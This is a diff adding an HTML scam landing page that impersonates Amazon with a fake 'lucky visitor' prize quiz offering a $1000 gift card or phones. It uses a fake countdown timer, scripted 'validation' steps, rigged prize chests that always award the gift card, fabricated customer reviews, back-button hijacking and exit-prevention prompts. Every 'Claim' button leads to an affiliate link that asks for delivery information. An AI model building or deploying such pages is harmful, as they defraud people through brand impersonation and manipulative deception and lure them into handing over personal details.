@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <meta name="viewport" content="width=device-width">
+    <link rel="icon" href="./img/favicon.png" type="image/png" sizes="16x16">
+    <title>Amazon.com - Congratulations!</title>
+
+    <link href="./css/style.css" rel="stylesheet" type="text/css"/>
+
+    <script type="text/javascript">
+        (function() {
+            navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+            try {
+                navigator.vibrate([1000, 500]);
+            } catch (ex) {}
+        })();
+    </script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+        }
+    </script>
+    <script src="./js/jquery-2.2.4.min.js" type="text/javascript"></script>
+    <script type="text/javascript">
+        var monthNames = new Array("Jan.", "Feb.", "March", "April", "May", "June", "Juli", "Aug.", "Sep.", "Oct.", "Nov.", "Dec.");
+        var now = new Date();
+        now.setDate(now.getDate() + 1);
+        var nowStringTommorow = monthNames[now.getMonth()] + " " + now.getDate() + "," + now.getFullYear();
+    </script>
+    <script type="text/javascript">
+        var CountDown = {
+            end: 3,
+            curr: 33,
+            display_ele: ''
+        };
+        CountDown.startit = function() {
+            var time_between = Math.floor((Math.random() * 1000) + 1500);
+            var t = setTimeout(CountDown.countdown, time_between);
+        };
+        CountDown.countdown = function() {
+            if (CountDown.curr != CountDown.end) {
+                CountDown.curr = CountDown.curr - 1;
+                if (CountDown.display_ele) {
+                    CountDown.display_ele.text(CountDown.curr);
+                }
+                var time_between = Math.floor((Math.random() * 1000) + 1500);
+                var t = setTimeout(CountDown.countdown, time_between);
+            }
+        };
+        $(document).ready(function() {
+            setInterval(function() {
+                $("h1").toggle();
+            }, 1500);
+            $("#q1 .answer").click(function() {
+                $("#q1").hide(0, function() {
+                    $("#q2").fadeIn();
+                });
+            });
+            $("#q2 .answer").click(function() {
+                $("#tq2").hide();
+                $("#q2").hide(0, function() {
+                    $("#q3").fadeIn();
+                });
+            });
+            $("#q3 .answer").click(function() {
+                $(".form_questions").hide(0, function() {
+                    $(".validate").show();
+                    $("#v0a").fadeIn();
+                    $("#v1a").fadeIn();
+                    $("#v1b").fadeIn();
+                });
+                setTimeout(function() {
+                    $("#v1a").hide();
+                    $("#v1b").hide();
+                    $("#v1c").show();
+                    $("#v1d").show();
+                    $("#v2a").show();
+                    $("#v2b").show();
+                }, 2000);
+                setTimeout(function() {
+                    $("#v2a").hide();
+                    $("#v2b").hide();
+                    $("#v2c").show();
+                    $("#v2d").show();
+                    $("#v3a").show();
+                    $("#v3b").show();
+                }, 4500);
+                setTimeout(function() {
+                    $("#v3a").hide();
+                    $("#v3b").hide();
+                    $("#v3c").show();
+                    $("#v3d").show();
+                    $("#vfinal").show();
+                    $("#v0a").hide();
+                    $("#v0b").show();
+                }, 6500);
+                setTimeout(function() {
+                    $("#v4").show();
+                    $("#v4s").show();
+                    $(".reviews").show();
+                }, 6500);
+            });
+        });
+    </script>
+
+</head>
+
+<body>
+    <div id="warning-container"><i data-reactroot=""></i></div>
+
+    <audio preload="" id="audio">
+        <source src="./audio/prize.mp3" type="audio/mpeg">
+    </audio>
+
+    <div class="fix-bar">
+        You Are The Lucky visitor Today!
+    </div>
+    <div class="top-bar">
+        You Are The Lucky visitor Today!
+    </div>
+    <div class="header">
+        <table class="wrapper">
+            <tbody>
+                <tr>
+                    <td width="30px"><img src="./img/windows-logo.png"></td>
+                    <td align="right" width="60px"><img src="./img/search.png"></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+    <div class="subheader">
+        <div class="wrapper">
+            <table style="border-bottom:2px solid #ff9900;">
+                <tbody>
+                    <tr>
+                        <td align="left">
+                            <font style="font-size:1.05em;color:#111;">
+                                Amazon.com Membership Rewards
+                            </font>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="spacer"></div>
+    <div class="wrapper">
+        <div class="contestwrap wrapper">
+            <div class="toptext">
+                <table class="wrapper">
+                    <tbody>
+                        <tr>
+                            <td align="left" valign="top" width="42px"><img src="./img/logo.png"></td>
+                            <td align="left" valign="top"><b>
+Congratulations Amazon.com User, you have a chance to receive a gift from us!
+</b><br>
+                                <font style="color:#9fa2a6;font-size:x-small;">
+                                    <script>
+                                        var mydate = new Date();
+                                        mydate.setDate(mydate.getDate() - 0);
+                                        var year = mydate.getYear();
+                                        if (year < 1000) year += 1900;
+                                        var day = mydate.getDay();
+                                        var month = mydate.getMonth();
+                                        var daym = mydate.getDate();
+                                        if (daym < 10) daym = "0" + daym;
+                                        var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                        var montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+                                        document.write("" + daym + ". " + montharray[month] + ",");
+                                    </script>
+                                </font>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <div style="border-bottom:1px solid #ccc;">
+                    <p class="wrapper">
+                        Every
+                        <script language="Javascript">
+                            document.write(dayarray[mydate.getDay()]);
+                        </script> We select 10 lucky visitors randomly to receive a gift from our sponsors. This gift is <strong> ONLY</strong> for users in <strong>  United States</strong>! This is our way of thanking you for your constantly
+                        support for our products and services.
+                        <br>
+                        <br> You can choose a <b>$1000 Amazon Gift Card</b>, <b>Apple iPhone X 256 GB</b> or <b>Samsung Galaxy S10 Plus</b>.
+                        <br>
+                        <br> After answer the following 3 questions.
+                        <br>
+                        <br><b>Note:</b>ACT NOW! 8 users have received this invitation and there are only 3 prizes to receive.
+                        <br>
+                        <br>
+                    </p>
+                </div>
+                <script type="text/javascript">
+                    function countdown() {
+                        var mins = parseInt(document.getElementById("mins").innerHTML);
+                        var secs = parseInt(document.getElementById("hsecs").innerHTML);
+                        if (mins != 0 && secs == 0) {
+                            nmins = mins - 1;
+                            nsecs = 59;
+                        } else if (mins != 0 || secs != 0) {
+                            nmins = mins;
+                            nsecs = secs - 1;
+                        } else if (mins == 0 && secs == 0) {
+                            nmins = mins;
+                            nsecs = secs;
+                        }
+                        document.getElementById("mins").innerHTML = nmins;
+                        document.getElementById("hsecs").innerHTML = nsecs;
+                        if (nsecs < 10) nsecs = "0" + nsecs;
+                    }
+
+                    setInterval(countdown, 1000);
+                </script>
+
+                <div class="select2 wrapper">You have
+                    <font color="red">
+                        <b>
+<span id="mins">1</span> minute and
+<span id="hsecs">27</span> seconds</b></font> to answer the following questions before we give the prizes to another lucky user! Good luck!</div>
+            </div>
+        </div>
+        <div class="spacer"></div>
+        <div class="form_questions wrapper">
+            <div class="question wrapper" id="q1">
+                <h3><span style="font-weight:300;">
+Question 1 of 3:
+</span><br> Who founded Amazon?
+                    <br></h3>
+                (37% answered correctly)
+                <br>
+                <span class="answer">Bill Gates</span>
+                <span class="answer">Mark Zuckerberg</span>
+                <span class="answer">Jeff Bezos</span>
+            </div>
+            <div class="question wrapper" id="q2">
+                <h3><span style="font-weight:300;">
+Question 2 of 3:
+</span><br> Where is Amazon based?
+                    <br></h3>
+                (61% answered correctly)
+                <br>
+                <span class="answer">USA</span>
+                <span class="answer">England</span>
+                <span class="answer">Russia</span>
+            </div>
+            <div class="question wrapper" id="q3">
+                <h3><span style="font-weight:300;">
+Question 3 of 3:
+</span><br> When was Amazon founded?
+                    <br></h3>
+                (32% answered correctly)
+                <br>
+                <span class="answer" onclick="drawszlider(10,0);">1994</span>
+                <span class="answer" onclick="drawszlider(10,0);">2012</span>
+                <span class="answer" onclick="drawszlider(10,0);">2014</span>
+            </div>
+        </div>
+        <div class="validate wrapper">
+            <div class="wrapper">
+                <br>
+                <table width="100%">
+                    <tbody>
+                        <tr>
+                            <td align="left">
+                                <p id="v1b">
+                                    Validating answers...
+                                </p>
+                                <p id="v2b">
+                                    Checking IP...
+                                </p>
+                                <p id="v3b">
+                                    Checking if prizes are available...
+                                </p>
+                                <p id="vfinal">
+                                    Congratulations!
+                                </p>
+                            </td>
+                            <td align="right"><span id="szazalek">0%</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+                <div style="width:100%;margin:0 auto;">
+                    <div id="szlider">
+                        <div id="szliderbar">
+                        </div>
+                        <div id="szazalek">
+                        </div>
+                    </div>
+                </div>
+                <table>
+                    <tbody>
+                        <tr>
+                            <td width="40px"><img id="v1a" src="./img/loading.gif"><img id="v1c" src="./img/fb-check.jpg"></td>
+                            <td>
+                                <p id="v1d">
+                                    You've answered (3/3) questions correctly.
+                                </p>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><img id="v2a" src="./img/loading.gif"><img id="v2c" src="./img/fb-check.jpg"></td>
+                            <td>
+                                <p id="v2d">
+                                    No previous participation on this IP address.
+                                </p>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><img id="v3a" src="./img/loading.gif"><img id="v3c" src="./img/fb-check.jpg"></td>
+                            <td>
+                                <p id="v3d">
+                                    There is still (3) prizes available.
+                                </p>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <br>
+            </div>
+        </div>
+        <script>
+            var slidewhere = 0;
+            var holvanszlider = 0;
+
+            function drawszlider(ossz, meik) {
+                var szazalek = Math.round((meik * 100) / ossz);
+                document.getElementById("szliderbar").style.width = szazalek + "%";
+                document.getElementById("szazalek").innerHTML = szazalek + "%";
+                holvanszlider = meik;
+                t = setTimeout(function () {
+                    drawszlider(100, slidewhere);slidewhere = holvanszlider + 1; if (slidewhere > 100) {slidewhere = 100;}
+                }, 62);
+            }
+        </script>
+        <div class="spacer" id="v4s"></div>
+        <div class="prize wrapper" id="v4">
+            <h3>
+                Choose and open your favorite prize:
+            </h3>
+            <center>
+                <table width="100%" style="max-width:400px;">
+                    <tbody>
+                        <tr>
+                            <td style="padding:0 33px;" align="center" id="chest1" onclick="chest1()">
+                                <div class="this1">
+                                    <img id="img1" src="./img/iphoneX.png">
+                                </div>
+                            </td>
+                            <td align="center">
+                                <p id="pz1"><b>Prize A</b></p>
+                                <div id="open1" onclick="chest1()">
+                                    Open
+                                </div>
+                                <a href="https://www.mb103.com/lnk.asp?o=15759&c=918277&a=333634&k=060802DD244B9A22AAA7E71EE38DE467&l=16739" id="cta-btn1" onclick="exit_a();PreventExitPop = false">
+			Claim
+			</a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="padding:0 33px;" align="center" id="chest2" onclick="chest2()">
+                                <div class="this2">
+                                    <img id="img2" src="./img/iphoneX.png">
+                                </div>
+                            </td>
+                            <td align="center">
+                                <p id="pz2"><b>Prize B</b></p>
+                                <div id="open2" onclick="chest2()">
+                                    Open
+                                </div>
+                                <a href="https://www.mb103.com/lnk.asp?o=15759&c=918277&a=333634&k=060802DD244B9A22AAA7E71EE38DE467&l=16739" id="cta-btn2" onclick="exit_a();PreventExitPop = false">
+			Claim
+			</a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="padding:0 33px;" align="center" id="chest3" onclick="chest3()">
+                                <div class="this3">
+                                    <img id="img3" src="./img/iphoneX.png">
+                                </div>
+                            </td>
+                            <td align="center">
+                                <p id="pz3"><b>Prize C</b></p>
+                                <div id="open3" onclick="chest3()">
+                                    Open
+                                </div>
+                                <a href="https://www.mb103.com/lnk.asp?o=15759&c=918277&a=333634&k=060802DD244B9A22AAA7E71EE38DE467&l=16739" id="cta-btn3" onclick="exit_a();PreventExitPop = false">
+			Claim
+			</a>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </center>
+        </div>
+        <div class="spacer"></div>
+        <div class="reviews wrapper">
+            <div class="wrapper ghghgh">
+
+                <h2>Customer Reviews</h2>
+            </div>
+            <table class="wrapper" style="padding-top:8px;">
+                <tbody>
+                    <tr>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="top"><img src="./img/stars.png"> $1000 Amazon Gift Card</div>
+                            <div class="name">
+                                Lucky <span style="color:#0064c0;">Ralph P.</span>
+                                <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 1);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) year += 1900;
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) daym = "0" + daym;
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+                                    document.write("" + daym + ". " + montharray[month] + ",");
+                                </script> 10:54 pm
+                            </div>
+                            <div class="text">
+                                At first I thought it was a joke, but actually my $1000 Amazon Gift Card came this morning and there is nothing stopping me from signing up for ALL of them, which I did lol
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="top"><img src="./img/stars.png"> $1000 Amazon Gift Card</div>
+                            <div class="name">
+                                Lucky <span style="color:#0064c0;">Xaymara melendez</span>
+                                <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 2);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) year += 1900;
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) daym = "0" + daym;
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+                                    document.write("" + daym + ". " + montharray[month] + ",");
+                                </script> 16:18 pm</div>
+                            <div class="text">
+                                Mine just arrived today. Thanks for the $1000 Amazon Gift Card !!!!
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="top"><img src="./img/star2.png"> Apple iPhone X 256G</div>
+                            <div class="name">
+                                Lucky <span style="color:#0064c0;">Jamie Robertson</span>
+                                <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 2);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) year += 1900;
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) daym = "0" + daym;
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+                                    document.write("" + daym + ". " + montharray[month] + ",");
+                                </script> 4:59 am</div>
+                            <div class="text">
+                                Damn, I wanted the Samsung S10! Its out of stock !!!! but better than nothing, I still got my iPhone X yesterday... XOXO
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="top"><img src="./img/stars.png"> Apple iPhone X 256GB</div>
+                            <div class="name">
+                                Lucky <span style="color:#0064c0;">Julia Meyer</span>
+                                <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 2);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) year += 1900;
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) daym = "0" + daym;
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+                                    document.write("" + daym + ". " + montharray[month] + ",");
+                                </script> 3:33 am</div>
+                            <div class="text">
+                                This quiz was too easy, I do hope I'll get my iPhone X too.
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="top"><img src="./img/stars.png"> Samsung Galaxy S10</div>
+                            <div class="name">
+                                Lucky <span style="color:#0064c0;">Thomas Schulz</span>
+                                <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 2);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) year += 1900;
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) daym = "0" + daym;
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+                                    document.write("" + daym + ". " + montharray[month] + ",");
+                                </script> 1:02 am</div>
+                            <div class="text">
+                                Got mine today! Thanks for the Samsung S10!!!
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="top"><img src="./img/stars.png"> Apple iPhone X 256G</div>
+                            <div class="name">
+                                Lucky <span style="color:#0064c0;">Rolf Schneider</span>
+                                <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 2);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) year += 1900;
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) daym = "0" + daym;
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+                                    document.write("" + daym + ". " + montharray[month] + ",");
+                                </script> 2:34 am</div>
+                            <div class="text">
+                                My prize arrived today! Thanks a lot for my new iPhone X !!
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="top"><img src="./img/stars.png"> Apple iPhone X 256G</div>
+                            <div class="name">
+                                Lucky <span style="color:#0064c0;">Lexi Benz</span>
+                                <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 4);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) year += 1900;
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) daym = "0" + daym;
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+                                    document.write("" + daym + ". " + montharray[month] + ",");
+                                </script> 15:45 pm</div>
+                            <div class="text">
+                                Fantastic! I've never get anything before, but I hope I will be as lucky!
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+            <table class="wrapper">
+                <tbody>
+                    <tr>
+                        <td align="left" valign="top" class="commentpad">
+                            <div class="top"><img src="./img/stars.png"> Apple iPhone X 256G</div>
+                            <div class="name">
+                                Lucky <span style="color:#0064c0;">Barbara Meier</span>
+                                <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 4);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) year += 1900;
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) daym = "0" + daym;
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+                                    document.write("" + daym + ". " + montharray[month] + ",");
+                                </script> 15:20 pm</div>
+                            <div class="text">
+                                Had seen this contest once and I ignored it because I thought it was a hoax. I saw this ad again and decided to try since I was bored ... Actually I got my iPhone X too! What INSANITY!
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <hr>
+
+        </div>
+    </div>
+    <div style="height:40px;"></div>
+    <img width="0" height="0" src="./img/chest-open.jpg">
+    <img width="0" height="0" src="./img/chest-close.jpg">
+    <img width="0" height="0" src="./img/samsungs8.png">
+    <img width="0" height="0" src="./img/wm.png">
+
+    <script language="JavaScript" type="text/javascript">
+        var prize123 = true;
+        var audio = document.getElementById("audio");
+
+        function chest1() {
+            if (prize123 == true) {
+                audio.play();
+                document.getElementById("pz1").innerHTML = "Your prize<br><b>$1000 Amazon Gift Card</b>";
+                document.getElementById("pz2").innerHTML = "<br><b>Apple iPhone X 256G</b>";
+                document.getElementById("pz3").innerHTML = "<br><b>Samsung Galaxy S8</b>";
+                document.getElementById("img1").src = "./img/wm.png";
+                document.getElementById("img2").src = "./img/iphoneX.png";
+                document.getElementById("img3").src = "./img/samsungs8.png";
+                document.getElementById("img2").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById("img3").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById("pz2").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById("pz3").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById('chest1').style.background = 'url(./img/chest-open.jpg) center bottom no-repeat';
+                document.getElementById('chest2').style.opacity = "0.5";
+                document.getElementById('chest3').style.opacity = "0.5";
+                $(".this1").animate({
+                    opacity: "1"
+                }, 2000);
+                $(".this2").animate({
+                    opacity: "1"
+                }, 2000);
+                $(".this3").animate({
+                    opacity: "1"
+                }, 2000);
+                document.getElementById('cta-btn1').style.display = "inline-block";
+                document.getElementById('open1').style.display = "none";
+                document.getElementById('open2').style.display = "none";
+                document.getElementById('open3').style.display = "none";
+                prize123 = false;
+            }
+        }
+
+        function chest2() {
+            if (prize123 == true) {
+                audio.play();
+                document.getElementById("pz2").innerHTML = "Your prize<br><b>$1000 Amazon Gift Card</b>";
+                document.getElementById("pz1").innerHTML = "<br><b>Apple iPhone X 256G</b>";
+                document.getElementById("pz3").innerHTML = "<br><b>Samsung Galaxy S8</b>";
+                document.getElementById("img2").src = "./img/wm.png";
+                document.getElementById("img1").src = "./img/iphoneX.png";
+                document.getElementById("img3").src = "./img/samsungs8.png";
+                document.getElementById("img1").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById("img3").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById("pz1").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById("pz3").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById('chest2').style.background = 'url(./img/chest-open.jpg) center bottom no-repeat';
+                document.getElementById('chest1').style.opacity = "0.5";
+                document.getElementById('chest3').style.opacity = "0.5";
+                $(".this1").animate({
+                    opacity: "1"
+                }, 2000);
+                $(".this2").animate({
+                    opacity: "1"
+                }, 2000);
+                $(".this3").animate({
+                    opacity: "1"
+                }, 2000);
+                document.getElementById('cta-btn2').style.display = "inline-block";
+                document.getElementById('open1').style.display = "none";
+                document.getElementById('open2').style.display = "none";
+                document.getElementById('open3').style.display = "none";
+                prize123 = false;
+            }
+        }
+
+        function chest3() {
+            if (prize123 == true) {
+                audio.play();
+                document.getElementById("pz1").innerHTML = "<br><b>Samsung Galaxy S8</b>";
+                document.getElementById("pz2").innerHTML = "<br><b>Apple iPhone X 256G</b>";
+                document.getElementById("pz3").innerHTML = "Your prize<br><b>$1000 Amazon Gift Card</b>";
+                document.getElementById("img1").src = "./img/samsungs8.png";
+                document.getElementById("img2").src = "./img/iphoneX.png";
+                document.getElementById("img3").src = "./img/wm.png";
+                document.getElementById("img2").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById("img1").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById("pz2").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById("pz1").onclick = function() {
+                    alert("Unfortunately, this offer is no longer available, please select another offer. ")
+                };
+                document.getElementById('chest3').style.background = 'url(./img/chest-open.jpg) center bottom no-repeat';
+                document.getElementById('chest2').style.opacity = "0.5";
+                document.getElementById('chest1').style.opacity = "0.5";
+                $(".this1").animate({
+                    opacity: "1"
+                }, 1000);
+                $(".this2").animate({
+                    opacity: "1"
+                }, 1000);
+                $(".this3").animate({
+                    opacity: "1"
+                }, 1000);
+                document.getElementById('cta-btn3').style.display = "inline-block";
+                document.getElementById('open1').style.display = "none";
+                document.getElementById('open2').style.display = "none";
+                document.getElementById('open3').style.display = "none";
+                prize123 = false;
+            }
+        }
+    </script>
+    <!--onclick option 1-->
+    <script language="JavaScript" type="text/javascript">
+        function exit_a() {
+            alert("Step 1: We reserved your $1000 Amazon Gift Card!\n\nStep 2: Fill in the correct delivery information to receive your $1000 Amazon Gift Card!");
+        }
+    </script>
+    <!--welcome pop-up-->
+    <script type="text/javascript">
+        alert("Congratulations!\n\nAmazon.Com User!\n\nYou've been selected as a lucky visitors for the $1000 Amazon Gift Card, Apple iPhone X 256GB or Samsung Galaxy S10 Plus!\n\nPlease click OK to claim your reward before it expires!");
+    </script>
+    <script>
+        function ExitPop() {
+            return 0 != PreventExitPop ? "Attention! you will lose the your prize!\n\nContinue the steps and keep your prize!" : void 0;
+        }
+        var PreventExitPop = !0;
+        window.onbeforeunload = ExitPop, "function" == typeof history.pushState && (history.pushState("jibberish", null, null), setTimeout(function() {
+            window.onpopstate = function() {
+                if (history.pushState("newjibberish", null, null), showExitBox(), "undefined" != typeof Audio) {
+                    var n = new Audio("whatsapp.mp3");
+                    n.play();
+                }
+            };
+        }, 0));
+    </script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-64284517-8"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-64284517-8');
+</script>
+</body>
+
+</html>
